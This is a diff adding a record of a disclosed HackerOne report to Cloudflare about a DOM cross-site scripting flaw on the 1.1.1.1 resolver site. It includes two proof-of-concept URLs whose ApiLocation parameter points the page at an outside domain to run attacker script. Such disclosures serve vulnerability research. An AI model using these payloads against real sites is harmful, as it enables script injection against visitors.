@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/418078
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/cujanovic
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:17.10.2018 17:07:28
+
+Summary:
+
+After discussion with Cloudflare on twitter I'm reporting this here.
+There is a DOM XSS on 1.1.1.1 or one.one.one.one site, it seems like the sink is `XMLHR.open(*,Taint,*,*,*)` and the source is `location.search`
+
+The PoC url's are:
+https://1.1.1.1/?ApiLocation=//localdomain.pw
+https://one.one.one.one/?ApiLocation=//localdomain.pw
+
+Screenshots:
+{F354664}
+{F354663}
+
+## Impact
+
+The attacker can execute JS code.
